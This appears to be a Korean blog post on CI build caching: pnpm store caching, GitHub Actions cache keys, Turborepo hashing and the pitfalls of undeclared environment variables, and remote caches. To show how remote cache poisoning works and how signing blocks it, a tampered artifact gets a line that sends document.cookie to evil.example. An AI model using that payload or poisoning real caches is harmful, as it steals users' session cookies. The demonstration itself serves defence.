@@ -1,0 +1,518 @@
+import { getPostMetadata } from "@/features/posts";
+
+export const metadata = getPostMetadata("build-caching");
+
+PR 하나에 한 줄을 고쳤는데 CI가 9분 돈다. 로그를 열어 보면 그중 4분이 의존성 설치고, 2분이 손대지 않은 패키지의 빌드다. 내 노트북에서는 두 번째 빌드부터 몇 초면 끝나는 일이다. 차이는 하나다. 노트북에는 지난번 결과가 남아 있고, CI 러너는 잡마다 빈 머신으로 시작한다.
+
+빌드 캐시는 "지난번에 같은 입력으로 만든 결과가 있으면 다시 만들지 않고 가져다 쓴다"는 생각이다. 간단해 보이지만 "같은 입력"을 어떻게 정하느냐에서 대부분의 사고가 난다. 입력을 너무 적게 보면 틀린 결과를 가져오고, 너무 많이 보면 캐시가 늘 빗나간다. 이 글은 CI 쪽 캐시를 다룬다. Dockerfile 안에서 레이어 캐시가 끊기는 원리와 BuildKit 캐시 마운트는 [Dockerfile과 이미지 레이어](/posts/dockerfile-image-layers)에서, buildx 캐시를 Actions 캐시에 두는 설정은 [GitHub Actions로 ECR에 올리기](/posts/github-actions-docker-ecr)에서 다뤘다.
+
+이 주제의 다른 글: [CI/CD의 뼈대](/posts/ci-cd-basics), [피처 플래그 운영](/posts/feature-flags), [롤백 전략](/posts/rollback-strategy).
+
+실습 환경은 Ubuntu 24.04, Node 22.22.0, pnpm 10.28.0, Turborepo 2.5.8이다. GitHub Actions 캐시는 [act](https://github.com/nektos/act) 0.2.82의 로컬 캐시 서버에 `actions/cache` v4.3.0을 붙여 실제로 돌렸다. 시간은 이 머신에서 잰 값이라 네트워크와 디스크에 따라 다르게 나온다.
+
+## 캐시가 기억하는 것은 입력과 결과의 짝이다
+
+어떤 캐시든 구조는 같다. 작업의 입력을 모아 해시를 내고, 그 해시를 이름(키)으로 결과를 저장한다. 다음에 같은 해시가 나오면 작업을 건너뛰고 저장된 결과를 꺼낸다. 이름이 내용에서 나오기 때문에 내용 주소 지정이라고도 부른다.
+
+<ConceptDiagram
+  caption="입력이 하나라도 키에서 빠지면, 그 입력이 바뀌어도 캐시는 모른다"
+  width={400}
+  height={280}
+  nodes={[
+    { id: "src", label: "소스 파일", sub: "내용 해시", x: 70, y: 40, w: 110 },
+    { id: "lock", label: "lockfile", sub: "의존성 버전", x: 70, y: 110, w: 110 },
+    { id: "env", label: "환경 변수", sub: "선언한 것만", x: 70, y: 180, w: 110 },
+    { id: "tool", label: "도구·OS", sub: "Node, 아키텍처", x: 70, y: 250, w: 110 },
+    { id: "key", label: "캐시 키", sub: "해시", x: 230, y: 145, w: 90 },
+    { id: "out", label: "결과물", sub: "dist, store", x: 340, y: 145, w: 96 },
+  ]}
+  edges={[
+    { from: "src", to: "key" },
+    { from: "lock", to: "key" },
+    { from: "env", to: "key" },
+    { from: "tool", to: "key", dashed: true },
+    { from: "key", to: "out", label: "저장" },
+  ]}
+/>
+
+CI에서 쓰는 캐시는 크게 두 층이다. 하나는 의존성 캐시다. 패키지 매니저가 내려받은 파일을 다음 실행에 다시 쓰게 한다. 키는 대개 lockfile의 해시다. 다른 하나는 작업 결과 캐시다. 빌드, 테스트, 린트의 결과물 자체를 저장한다. Turborepo, Nx, Bazel이 이쪽이고, 키를 만드는 입력이 훨씬 많다. Docker 레이어 캐시는 둘 사이에 있다. Dockerfile의 각 줄이 작업이고, 줄의 내용과 앞 레이어가 입력이다.
+
+## 의존성 설치는 무엇을 캐시해야 빨라지나
+
+먼저 효과부터 쟀다. 런타임 의존성 다섯 개와 TypeScript, ESLint, Vitest를 넣은 프로젝트(lockfile 기준 패키지 264개)에서 `pnpm install --frozen-lockfile`을 세 가지 상황으로 돌렸다.
+
+```bash
+# 세 가지 상황에서 설치 시간을 잰다 (bench-pnpm.sh 요약)
+rm -rf store node_modules                                   # 1) 아무것도 없음
+pnpm install --frozen-lockfile --store-dir store
+rm -rf node_modules                                          # 2) store만 남김
+pnpm install --frozen-lockfile --prefer-offline --store-dir store
+pnpm install --frozen-lockfile --prefer-offline --store-dir store   # 3) node_modules까지 있음
+```
+
+```text
+run 1  cold=13.68s  store-only=2.13s  node_modules=1.02s
+run 2  cold=4.57s  store-only=1.96s  node_modules=1.02s
+run 3  cold=3.98s  store-only=1.94s  node_modules=1.06s
+```
+
+첫 줄의 13.68초는 레지스트리 앞단(이 환경에서는 프록시)이 아직 데워지지 않았을 때다. 매번 처음부터 받는 설치는 네트워크 상태에 따라 이렇게 크게 흔들린다. store가 있으면 2초 안팎으로 안정된다. pnpm의 store는 패키지 파일을 내용 해시로 저장해 두는 곳이고, `node_modules`는 거기서 링크를 거는 것이라 store만 있으면 다시 받을 게 없다.
+
+store가 정말 쓰이는지는 오프라인 설치로 확인할 수 있다. store가 비어 있으면 이렇게 멈춘다.
+
+```bash
+# 네트워크를 쓰지 않고 설치해 본다. store가 비어 있으면 실패해야 한다
+pnpm install --frozen-lockfile --offline --store-dir ./empty-store
+```
+
+```text
+ ERR_PNPM_NO_OFFLINE_TARBALL  A package is missing from the store but cannot download it in offline mode. The missing package may be downloaded from https://registry.npmjs.org/axios/-/axios-1.12.2.tgz.
+```
+
+그래서 CI에서는 대개 `node_modules`가 아니라 패키지 매니저의 저장소를 캐시한다. pnpm은 store, npm은 `~/.npm`, Yarn Berry는 `.yarn/cache`다. `node_modules`를 통째로 캐시하면 더 빠를 것 같지만 문제가 많다. 네이티브 모듈은 Node 버전과 OS에 묶여 빌드되고, `postinstall` 스크립트가 만든 파일이 섞이고, `npm ci`는 시작할 때 `node_modules`를 지워 버린다. `actions/setup-node`의 `cache: pnpm` 옵션도 store를 캐시한다.
+
+## 캐시 키 한 줄 뜯어보기
+
+GitHub Actions에서 캐시는 `actions/cache`로 건다. 실습 워크플로의 캐시 단계다.
+
+```yaml
+- uses: actions/cache@v4
+  id: pnpm-cache
+  with:
+    path: store
+    key: pnpm-${{ runner.os }}-${{ hashFiles('pnpm-lock.yaml') }}
+    restore-keys: |
+      pnpm-${{ runner.os }}-
+```
+
+실행하면 키가 `pnpm-Linux-8fb2c652…`로 펼쳐진다. 조각을 눌러 보자.
+
+<UrlAnatomy
+  caption="펼쳐진 캐시 키 한 줄"
+  base="key:"
+  separator=" "
+  joiner="-"
+  params={[
+    { key: "prefix", display: "pnpm", title: "무엇의 캐시인가", description: "같은 저장소에 여러 캐시가 섞이므로 앞에 종류를 붙인다. restore-keys의 접두사 검색이 이 이름부터 맞춰 본다.", required: true },
+    { key: "os", display: "Linux", title: "어디서 만든 캐시인가", description: "runner.os. macOS 러너가 만든 store를 Linux가 받으면 네이티브 바이너리가 맞지 않을 수 있다. Node 메이저 버전이나 CPU 아키텍처가 결과물에 영향을 주면 그것도 넣는다." },
+    { key: "hash", display: "8fb2c652d112…", title: "lockfile의 해시", description: "hashFiles는 파일마다 sha256을 내고 그것들을 다시 해시한다. 그래서 sha256sum pnpm-lock.yaml 값(94fef348…)과는 다르다. 의존성 버전이 하나라도 바뀌면 키 전체가 바뀐다.", code: "hashFiles('pnpm-lock.yaml')\n= 8fb2c652d11215bc2a55cf63a9849dfb20f8f58195b3195e509cfb92a46644a5", required: true },
+  ]}
+/>
+
+키 설계의 기준은 하나다. 결과물에 영향을 주는 것은 키에 넣고, 영향을 주지 않는 것은 넣지 않는다. 날짜나 실행 번호(`github.run_id`)를 넣으면 매번 빗나가는 캐시가 되고, lockfile 대신 `package.json`을 해시하면 같은 범위 안에서 버전이 바뀌어도 모른다.
+
+## 정확히 맞지 않으면 비슷한 것이라도
+
+act로 같은 워크플로를 세 번 돌렸다. 처음에는 캐시가 없다.
+
+```text
+[ci/install] ⭐ Run Main actions/cache@v4
+[ci/install]   | Cache not found for input keys: pnpm-Linux-8fb2c652d11215bc2a55cf63a9849dfb20f8f58195b3195e509cfb92a46644a5, pnpm-Linux-
+[ci/install]   | cache-hit=
+[ci/install]   | Done in 4.4s using pnpm v10.28.0
+[ci/install] ⭐ Run Post actions/cache@v4
+[ci/install]   | Cache Size: ~24 MB (25686311 B)
+[ci/install]   | Cache saved with key: pnpm-Linux-8fb2c652d11215bc2a55cf63a9849dfb20f8f58195b3195e509cfb92a46644a5
+```
+
+두 번째는 lockfile이 같으니 키가 정확히 맞는다. `cache-hit`이 `true`이고, 잡이 끝날 때 저장을 건너뛴다. act의 캐시 서버는 찾은 키를 소문자로 돌려줘서 `linux`로 찍힌다.
+
+```text
+[ci/install]   | Cache restored from key: pnpm-linux-8fb2c652d11215bc2a55cf63a9849dfb20f8f58195b3195e509cfb92a46644a5
+[ci/install]   ⚙  ::set-output:: cache-hit=true
+[ci/install]   | Done in 1.7s using pnpm v10.28.0
+[ci/install] ⭐ Run Post actions/cache@v4
+[ci/install]   | Cache hit occurred on the primary key pnpm-Linux-8fb2c652d11215bc2a55cf63a9849dfb20f8f58195b3195e509cfb92a46644a5, not saving cache.
+```
+
+세 번째는 의존성 하나(`ms`)를 추가해 lockfile이 바뀐 커밋이다. 새 키는 없지만 `restore-keys`의 접두사 `pnpm-Linux-`로 이전 캐시를 찾는다. 이걸 부분 적중이라고 한다. `cache-hit`은 `false`라서 잡이 끝날 때 새 키로 저장한다.
+
+```text
+[ci/install]   | Cache restored from key: pnpm-linux-8fb2c652d11215bc2a55cf63a9849dfb20f8f58195b3195e509cfb92a46644a5
+[ci/install]   ⚙  ::set-output:: cache-hit=false
+[ci/install]   | Done in 2s using pnpm v10.28.0
+[ci/install] ⭐ Run Post actions/cache@v4
+[ci/install]   | Cache saved with key: pnpm-Linux-89e8530c5fb931d46ddc165a379d5c84bbe945988c413797b312802906a439c1
+```
+
+아래 그림은 이 세 번의 실행에서 캐시 단계가 무엇을 하는지 순서대로 보여 준다.
+
+<SequenceDiagram
+  caption="actions/cache는 잡 앞에서 찾고, 잡 뒤에서 저장한다"
+  actors={[
+    { id: "job", label: "잡" },
+    { id: "act", label: "cache 액션" },
+    { id: "srv", label: "캐시 저장소" },
+  ]}
+  steps={[
+    { from: "act", to: "srv", label: "key?", title: "정확한 키부터", detail: "첫 실행. pnpm-Linux-8fb2…를 찾는다. 없다.", payload: "Cache not found for input keys: pnpm-Linux-8fb2…, pnpm-Linux-" },
+    { from: "job", to: "job", label: "install 4.4s", title: "처음부터 받는다", detail: "store가 비어 있으니 모든 패키지를 레지스트리에서 받는다." },
+    { from: "act", to: "srv", label: "save 24MB", title: "잡이 끝나면 저장", detail: "Post 단계에서 store를 묶어 올린다. 이 키의 캐시는 이제 바꿀 수 없다.", payload: "Cache saved with key: pnpm-Linux-8fb2…" },
+    { from: "srv", to: "act", label: "exact hit", title: "같은 lockfile", detail: "두 번째 실행. 키가 정확히 맞아 cache-hit=true다. 설치는 1.7초. 저장은 건너뛴다." },
+    { from: "srv", to: "act", label: "prefix hit", title: "lockfile이 바뀌면", detail: "세 번째 실행. 정확한 키는 없고 restore-keys 접두사로 가장 최근 캐시를 받는다. 새 패키지 하나만 내려받는다." },
+    { from: "act", to: "srv", label: "save new key", title: "새 키로 저장", detail: "cache-hit=false였으니 Post 단계가 새 키로 저장한다. 다음 실행부터는 정확히 맞는다.", payload: "Cache saved with key: pnpm-Linux-89e8…" },
+  ]}
+/>
+
+캐시를 복원하는 것도 공짜는 아니다. 위 실행에서 24MB를 풀어 놓는 데 4.5초 남짓 걸렸고, 처음부터 설치해도 4.4초였다. 이 정도 규모에 레지스트리가 빠르면 캐시의 이득은 작다. 의존성이 수백 MB이거나, 네이티브 모듈을 컴파일하거나, 레지스트리가 느리고 가끔 실패할 때 차이가 커진다. 캐시를 걸기 전에 설치 단계가 실제로 몇 초인지부터 본다.
+
+## 키는 어떤 순서로 맞춰 보나
+
+`actions/cache`가 키를 찾는 순서에는 규칙이 있다. 지금 브랜치의 캐시에서 먼저 primary key의 정확한 일치를, 그다음 접두사 일치를 찾는다. 없으면 `restore-keys`를 위에서부터 하나씩 같은 방식으로 찾는다. 접두사로 여러 개가 맞으면 가장 최근에 만든 것을 고른다. 지금 브랜치에서 못 찾으면 기본 브랜치(대개 main)의 캐시에서 같은 순서로 다시 찾는다.
+
+<AlgoTrace
+  caption="feat/pay 브랜치에서 pnpm-Linux-zzz를 찾는 순서"
+  memoryLabel="후보"
+  cells={["main·aaa(1)", "main·bbb(5)", "feat/cart·ccc(7)", "main·macOS(9)"]}
+  steps={[
+    { memory: ["feat/pay 범위"], caption: "먼저 feat/pay 브랜치가 만든 캐시를 본다. 이 브랜치는 아직 캐시를 만든 적이 없다." },
+    { pointer: 2, memory: ["보이지 않음"], caption: "feat/cart의 캐시는 형제 브랜치 것이라 feat/pay에서는 보이지 않는다." },
+    { pointer: 0, memory: ["main 범위", "정확: 없음"], caption: "기본 브랜치 main으로 넘어간다. pnpm-Linux-zzz와 정확히 같은 키는 없다." },
+    { pointer: 1, memory: ["접두사 pnpm-Linux-", "aaa(1)", "bbb(5)"], caption: "restore-keys의 pnpm-Linux-로 접두사가 맞는 것이 둘이다." },
+    { pointer: 1, found: [1], memory: ["bbb(5) 선택"], caption: "둘 중 더 최근에 만든 bbb를 받는다. macOS 캐시는 접두사가 달라 후보가 아니다." },
+  ]}
+/>
+
+이 규칙을 직접 구현해 보면 경계가 잘 보인다. 아래 함수는 캐시 목록과 키, 지금 브랜치, 기본 브랜치를 받아 복원할 키를 돌려준다.
+
+<CodePlayground
+  caption="actions/cache가 복원할 키 고르기"
+  functionName="findCache"
+  initialCode={`function findCache(entries, key, restoreKeys, branch, defaultBranch) {
+  // entries: [{ key, branch, createdAt }]
+  // 1. 지금 브랜치, 그다음 기본 브랜치 순서로 본다 (같으면 한 번만)
+  // 2. 범위마다 [key, ...restoreKeys] 순서로
+  //    정확히 같은 키 → 있으면 그것, 없으면 접두사가 맞는 것 중 가장 최근 것
+  // 3. 아무것도 없으면 null
+  return null;
+}`}
+  solution={`function findCache(entries, key, restoreKeys, branch, defaultBranch) {
+  const scopes = branch === defaultBranch ? [branch] : [branch, defaultBranch];
+  for (const scope of scopes) {
+    const inScope = entries.filter((e) => e.branch === scope);
+    for (const k of [key, ...restoreKeys]) {
+      const exact = inScope.find((e) => e.key === k);
+      if (exact) return exact.key;
+      const prefixed = inScope
+        .filter((e) => e.key.startsWith(k))
+        .sort((a, b) => b.createdAt - a.createdAt);
+      if (prefixed.length) return prefixed[0].key;
+    }
+  }
+  return null;
+}`}
+  tests={[
+    { label: "main, 정확히 일치", args: [[{ key: "pnpm-Linux-aaa", branch: "main", createdAt: 1 }, { key: "pnpm-Linux-bbb", branch: "main", createdAt: 5 }, { key: "pnpm-Linux-ccc", branch: "feat/cart", createdAt: 7 }, { key: "pnpm-macOS-ddd", branch: "main", createdAt: 9 }], "pnpm-Linux-bbb", ["pnpm-Linux-"], "main", "main"], expected: "pnpm-Linux-bbb" },
+    { label: "main, 접두사로 최근 것", args: [[{ key: "pnpm-Linux-aaa", branch: "main", createdAt: 1 }, { key: "pnpm-Linux-bbb", branch: "main", createdAt: 5 }, { key: "pnpm-Linux-ccc", branch: "feat/cart", createdAt: 7 }, { key: "pnpm-macOS-ddd", branch: "main", createdAt: 9 }], "pnpm-Linux-zzz", ["pnpm-Linux-"], "main", "main"], expected: "pnpm-Linux-bbb" },
+    { label: "feat/cart는 자기 캐시가 먼저", args: [[{ key: "pnpm-Linux-aaa", branch: "main", createdAt: 1 }, { key: "pnpm-Linux-bbb", branch: "main", createdAt: 5 }, { key: "pnpm-Linux-ccc", branch: "feat/cart", createdAt: 7 }, { key: "pnpm-macOS-ddd", branch: "main", createdAt: 9 }], "pnpm-Linux-zzz", ["pnpm-Linux-"], "feat/cart", "main"], expected: "pnpm-Linux-ccc" },
+    { label: "feat/pay는 main으로 넘어간다", args: [[{ key: "pnpm-Linux-aaa", branch: "main", createdAt: 1 }, { key: "pnpm-Linux-bbb", branch: "main", createdAt: 5 }, { key: "pnpm-Linux-ccc", branch: "feat/cart", createdAt: 7 }, { key: "pnpm-macOS-ddd", branch: "main", createdAt: 9 }], "pnpm-Linux-zzz", ["pnpm-Linux-"], "feat/pay", "main"], expected: "pnpm-Linux-bbb" },
+    { label: "맞는 접두사가 없다", args: [[{ key: "pnpm-Linux-aaa", branch: "main", createdAt: 1 }, { key: "pnpm-macOS-ddd", branch: "main", createdAt: 9 }], "pnpm-Windows-zzz", ["pnpm-Windows-"], "main", "main"], expected: null },
+    { label: "main은 기능 브랜치 캐시를 못 본다", args: [[{ key: "pnpm-Linux-aaa", branch: "main", createdAt: 1 }, { key: "pnpm-Linux-ccc", branch: "feat/cart", createdAt: 7 }], "pnpm-Linux-ccc", [], "main", "main"], expected: null },
+  ]}
+/>
+
+여기서 실무 규칙 몇 가지가 나온다. 캐시 항목은 한 번 저장하면 같은 키로 덮어쓸 수 없다. 그래서 키가 내용과 같이 바뀌지 않으면(예: `pnpm-Linux` 고정) 첫 캐시가 영원히 남고 새 의존성은 매번 다시 받는다. 저장소마다 용량 한도(기본 10GB)가 있고 넘치면 오래 안 쓴 것부터 지워지며, 일주일 동안 접근하지 않은 항목도 지워진다. 기능 브랜치는 main의 캐시를 읽을 수 있지만 반대는 안 된다. main에서 캐시를 주기적으로 만들어 두지 않으면 모든 PR이 빈손으로 시작한다.
+
+부분 적중에는 부작용이 있다. 접두사로 이전 store를 받고 새 패키지를 더해 저장하는 일이 반복되면, 지금은 쓰지 않는 옛 패키지가 store에 계속 쌓인다. 캐시가 몇 GB로 불어나 복원 시간이 설치 시간보다 길어지는 일이 생긴다. 가끔 `pnpm store prune`으로 정리하거나 키 접두사에 버전 숫자(`pnpm-v2-`)를 넣어 한 번씩 새로 시작한다.
+
+## 작업 결과까지 캐시하는 도구들
+
+의존성 캐시는 설치만 줄인다. 모노레포에서 패키지가 수십 개면 바뀌지 않은 패키지의 빌드와 테스트를 다시 돌리는 시간이 더 크다. Turborepo, Nx, Bazel은 작업마다 입력을 해시해서 결과물을 저장한다. 실습용으로 패키지 둘짜리 모노레포를 만들었다. `@mono/price`는 TypeScript 라이브러리고, `@mono/web`은 그걸 쓰는 앱이다.
+
+```json
+{
+  "tasks": {
+    "build": { "dependsOn": ["^build"], "outputs": ["dist/**"] }
+  }
+}
+```
+
+`^build`는 "내가 의존하는 패키지의 build를 먼저"라는 뜻이고, `outputs`는 캐시에 담을 결과물이다. 처음과 두 번째 실행이다.
+
+```bash
+# 같은 명령을 두 번 돌린다
+npx turbo run build
+npx turbo run build
+```
+
+```text
+@mono/price:build: cache miss, executing dd112700b84d8665
+@mono/web:build: cache miss, executing 018b7ff749e0ecf4
+ Tasks:    2 successful, 2 total
+Cached:    0 cached, 2 total
+  Time:    3.304s 
+
+@mono/price:build: cache hit, replaying logs dd112700b84d8665
+@mono/web:build: cache hit, replaying logs 018b7ff749e0ecf4
+ Tasks:    2 successful, 2 total
+Cached:    2 cached, 2 total
+  Time:    49ms >>> FULL TURBO
+```
+
+3.3초가 49ms가 됐다. 캐시가 맞으면 Turbo는 명령을 실행하지 않고 저장해 둔 `dist`를 풀어 놓은 뒤 그때의 로그를 다시 보여 준다. 그래서 로그에 `> tsc -p .`가 찍혀도 실제로 tsc가 돈 것은 아니다.
+
+무엇이 해시에 들어가는지 파일을 하나씩 바꿔 가며 확인했다.
+
+```text
+=== README (저장소 루트)
+@mono/price:build: cache hit, replaying logs dd112700b84d8665
+@mono/web:build: cache hit, replaying logs 018b7ff749e0ecf4
+=== apps/web/src만 수정
+@mono/price:build: cache hit, replaying logs dd112700b84d8665
+@mono/web:build: cache miss, executing 5daa89f42743437b
+=== packages/price/src 수정
+@mono/price:build: cache miss, executing ac930ee2276adb4c
+@mono/web:build: cache miss, executing 6cbc49789c92a8d8
+```
+
+루트 README는 어느 작업의 입력도 아니라 둘 다 적중이다. web의 소스만 바꾸면 web만 다시 빌드한다. price를 바꾸면 price가 다시 빌드되고, price에 의존하는 web도 다시 빌드된다. 의존하는 패키지의 해시가 내 해시의 입력이기 때문이다. Nx도 같은 원리고, Bazel은 이걸 더 엄격하게 한다. 작업이 선언하지 않은 파일은 아예 읽지 못하게 샌드박스에 가둬서, 선언한 입력이 곧 실제 입력이 되도록 만든다. 대신 모든 입력과 출력을 BUILD 파일에 적어야 해서 도입 비용이 크다.
+
+## 해시에 없는 입력이 만드는 틀린 적중
+
+작업 결과 캐시에서 가장 위험한 실수는 결과물에 영향을 주는데 해시에는 없는 입력이다. 이 실습의 web 빌드는 `API_URL` 환경 변수를 결과물에 박아 넣는다. Turbo 2는 기본이 엄격 모드(strict)라서, turbo.json에 선언하지 않은 환경 변수는 작업에 아예 넘기지 않는다.
+
+```bash
+# 운영 주소를 줘서 빌드한다 (env 선언 없음, 기본 strict 모드)
+API_URL=https://api.shop.example npx turbo run build
+```
+
+```text
+@mono/web:build: cache hit, replaying logs 6cbc49789c92a8d8
+@mono/web:build: web built: API_URL=http://localhost:3000, sample total=3600
+Cached:    2 cached, 2 total
+```
+
+운영 주소를 줬는데 결과물에는 기본값 `localhost`가 들어 있다. 변수가 전달되지 않았기 때문이다. 이걸 보고 `--env-mode=loose`로 바꾸면 변수는 넘어가지만 여전히 해시에는 들어가지 않는다. 운영 주소로 한 번 빌드한 다음, 스테이징 주소로 다시 빌드해 봤다.
+
+```bash
+# loose 모드: 변수는 넘기지만 해시에는 넣지 않는다
+API_URL=https://api.shop.example npx turbo run build --env-mode=loose
+API_URL=https://staging-api.shop.example npx turbo run build --env-mode=loose
+head -1 apps/web/dist/app.js
+```
+
+```text
+@mono/web:build: cache miss, executing a3a37ae3b5d79f8d
+@mono/web:build: web built: API_URL=https://api.shop.example, sample total=3600
+
+@mono/web:build: cache hit, replaying logs a3a37ae3b5d79f8d
+@mono/web:build: web built: API_URL=https://api.shop.example, sample total=3600
+Cached:    2 cached, 2 total
+  Time:    66ms >>> FULL TURBO
+const API_URL = "https://api.shop.example";
+```
+
+스테이징 빌드인데 운영 주소가 박힌 결과물이 나왔다. 해시가 같으니 Turbo 입장에서는 정상적인 적중이다. 로그까지 그때 것을 다시 보여 주니 겉으로는 아무 이상이 없어 보인다. 이 결과물이 스테이징에 올라가면 스테이징 화면이 운영 API에 주문을 넣는다.
+
+고치는 방법은 결과물에 영향을 주는 변수를 `env`에 선언하는 것이다.
+
+```json
+{ "tasks": { "build": { "dependsOn": ["^build"], "outputs": ["dist/**"], "env": ["API_URL"] } } }
+```
+
+```text
+@mono/web:build: cache miss, executing f5f793c25456b068
+@mono/web:build: web built: API_URL=https://staging-api.shop.example, sample total=3600
+@mono/web:build: cache miss, executing 1b55c4707a023c6e
+@mono/web:build: web built: API_URL=https://api.shop.example, sample total=3600
+```
+
+이제 주소마다 해시가 다르다. `--dry`로 무엇이 해시에 들어갔는지 볼 수 있다. 값 자체는 찍지 않고 sha256만 보여 준다(`https://api.shop.example`의 sha256이 `7f33b3fb…`다).
+
+```bash
+# 작업을 실행하지 않고 해시 입력만 본다
+API_URL=https://api.shop.example npx turbo run build --dry=text --filter=@mono/web
+```
+
+```text
+@mono/web#build
+  Hash                           = 1b55c4707a023c6e
+  Cached (Local)                 = true
+  Cached (Remote)                = false
+  Inputs Files Considered        = 3
+  Env Vars                       = API_URL
+  Env Vars Values                = API_URL=7f33b3fbe9b15ff79a78d02d8b8ca0c97bb3d5ad843acf65d6f49070a54591b5
+  Inferred Env Vars Values       = 
+```
+
+캐시가 이상하다 싶을 때 볼 곳이 여기다. Turbo는 `NEXT_PUBLIC_`처럼 프레임워크가 정한 접두사의 변수는 알아서 넣어 주지만(위 출력의 `Inferred Env Vars`), 직접 만든 변수는 사람이 적어야 한다. 환경 변수 말고도 같은 종류의 함정이 있다. 빌드 스크립트가 저장소 밖의 파일을 읽거나, 현재 시각이나 git 커밋을 결과물에 넣거나, 네트워크에서 무언가를 받아 오면 해시가 그걸 모른다.
+
+## 원격 캐시는 팀 전체의 기억이다
+
+로컬 캐시는 내 머신에만 있다. CI 러너는 매번 새 머신이니 로컬 캐시가 쓸모없다. 원격 캐시는 결과물을 서버에 올려 두고, 같은 해시를 계산한 다른 머신이 받아 가게 한다. Turbo는 Vercel이 운영하는 원격 캐시를 기본으로 쓰지만, 같은 HTTP API를 구현하면 직접 둘 수도 있다. 실습에서는 node로 40줄이 안 되는 캐시 서버를 짜서 `TURBO_API`로 붙였다. `GET`, `PUT /v8/artifacts/{hash}`만 처리하면 된다.
+
+```bash
+# 원격 캐시 서버를 띄우고, 두 개의 체크아웃에서 차례로 빌드한다
+node remote-cache.mjs ./rc-store &
+export TURBO_API=http://127.0.0.1:4100 TURBO_TOKEN=ci-token TURBO_TEAM=shop
+(cd mono   && npx turbo run build)   # 머신 A: CI 러너라고 치자
+(cd mono-b && npx turbo run build)   # 머신 B: 다른 경로에 clone한 사본
+```
+
+```text
+=== A
+• Remote caching enabled
+@mono/price:build: cache miss, executing 17e0eca65b0080d7
+@mono/web:build: cache miss, executing 1b55c4707a023c6e
+  Time:    4.446s 
+=== B (다른 머신)
+• Remote caching enabled
+@mono/price:build: cache hit, replaying logs 17e0eca65b0080d7
+@mono/web:build: cache hit, replaying logs 1b55c4707a023c6e
+  Time:    87ms >>> FULL TURBO
+--- server log
+GET /v8/artifacts/17e0eca65b0080d7 -> 404
+GET /v8/artifacts/1b55c4707a023c6e -> 404
+PUT /v8/artifacts/17e0eca65b0080d7 -> 202
+PUT /v8/artifacts/1b55c4707a023c6e -> 202
+GET /v8/artifacts/17e0eca65b0080d7 -> 200
+GET /v8/artifacts/1b55c4707a023c6e -> 200
+```
+
+B는 경로가 다른 곳에 clone한 사본인데도 해시가 A와 똑같다. 해시가 절대 경로가 아니라 파일 내용과 설정에서 나오기 때문이다. 한 사람이 빌드한 결과를 팀 전체와 CI가 같이 쓰게 된다.
+
+<NetworkTopology
+  caption="원격 캐시: 한 번 빌드하면 모두가 받아 간다"
+  width={400}
+  height={300}
+  zones={[
+    { id: "ci", label: "CI", x: 10, y: 10, w: 180, h: 130, tone: "neutral" },
+    { id: "dev", label: "개발자", x: 10, y: 160, w: 180, h: 130, tone: "private" },
+  ]}
+  nodes={[
+    { id: "a", label: "runner A", sub: "main 빌드", x: 100, y: 75, icon: "server" },
+    { id: "b", label: "laptop B", sub: "같은 커밋", x: 100, y: 225, icon: "client" },
+    { id: "rc", label: "remote cache", sub: "/v8/artifacts", x: 300, y: 150, icon: "db", w: 120 },
+  ]}
+  links={[
+    { from: "a", to: "rc", label: "PUT" },
+    { from: "rc", to: "b", label: "GET" },
+  ]}
+  steps={[
+    { path: ["a", "rc"], packet: "GET 404", title: "먼저 물어본다", detail: "A가 해시 1b55c470…를 계산해 원격 캐시에 묻는다. 아직 없다." },
+    { path: ["a"], title: "직접 빌드한다", detail: "tsc와 build.js를 실제로 돌린다. 4.4초 걸렸다." },
+    { path: ["a", "rc"], packet: "PUT", title: "결과를 올린다", detail: "dist와 로그를 묶어 해시 이름으로 올린다.", payload: "PUT /v8/artifacts/1b55c4707a023c6e -> 202" },
+    { path: ["b", "rc", "b"], packet: "GET 200", highlight: ["dev"], title: "다른 머신이 받아 간다", detail: "B도 같은 해시를 계산한다. 서버에 있으니 받아서 풀어 놓는다. 87ms에 끝났다." },
+  ]}
+/>
+
+## 남이 올린 결과물을 믿어도 되나
+
+원격 캐시는 편한 만큼 위험하다. 캐시에서 받은 결과물은 소스에서 빌드한 것이 아니라 누군가 올린 파일이다. 해시는 "이 입력으로 만들었다"는 이름표일 뿐, 내용이 그 입력에서 나왔다는 증명이 아니다. 쓰기 권한이 있는 누군가가 그 이름표를 단 다른 파일을 올리면 모두가 그걸 받는다. 이걸 캐시 오염(cache poisoning)이라고 부른다.
+
+실제로 해 봤다. web 빌드 결과물(`1b55c470…`)을 내려받아 `dist/app.js` 끝에 한 줄을 덧붙이고, 같은 해시 이름으로 다시 올렸다. 그리고 로컬 캐시를 지운 깨끗한 체크아웃에서 빌드했다.
+
+```bash
+# 변조한 결과물을 같은 해시로 올린다 (쓰기 토큰만 있으면 된다)
+curl -X PUT -H "Authorization: Bearer ci-token" --data-binary @b.tar.zst \
+  http://127.0.0.1:4100/v8/artifacts/1b55c4707a023c6e
+# 깨끗한 체크아웃에서 빌드하고 결과물을 본다
+rm -rf .turbo apps/web/dist && npx turbo run build && cat apps/web/dist/app.js
+```
+
+```text
+202
+@mono/price:build: cache hit, replaying logs 17e0eca65b0080d7
+@mono/web:build: cache hit, replaying logs 1b55c4707a023c6e
+Cached:    2 cached, 2 total
+  Time:    104ms >>> FULL TURBO
+const API_URL = "https://api.shop.example";
+fetch(API_URL + "/cart").then((r) => r.json()).then(console.log);
+// v2
+fetch("https://evil.example/steal?c=" + document.cookie);
+```
+
+FULL TURBO, 정상적인 적중처럼 보인다. 소스에는 없는 마지막 줄이 결과물에 들어갔다. 이걸 막는 방법은 결과물에 서명을 다는 것이다. Turbo는 turbo.json에 `"remoteCache": { "signature": true }`를 켜고 `TURBO_REMOTE_CACHE_SIGNATURE_KEY`를 주면, 올릴 때 결과물과 해시로 HMAC 서명을 만들어 `x-artifact-tag` 헤더에 붙이고, 받을 때 검증한다. 서명을 켠 뒤 같은 변조를 다시 했다. 이번에는 정상 결과물의 서명 헤더까지 그대로 베껴서 올렸다.
+
+```text
+@mono/price:build: cache hit, replaying logs 17e0eca65b0080d7
+@mono/web:build: cache miss, executing 1b55c4707a023c6e
+@mono/web:build: web built: API_URL=https://api.shop.example, sample total=3600
+Cached:    1 cached, 2 total
+--- server log
+GET /v8/artifacts/1b55c4707a023c6e -> 200
+PUT /v8/artifacts/1b55c4707a023c6e -> 202
+```
+
+서버는 변조된 파일을 200으로 돌려줬지만 서명이 내용과 맞지 않으니 Turbo가 버리고 직접 빌드했다. 그리고 정상 결과물을 다시 올려 오염을 덮었다. 경고 없이 조용히 빗나가는 것으로 처리되니, 적중률이 갑자기 떨어지면 의심해 볼 단서가 된다.
+
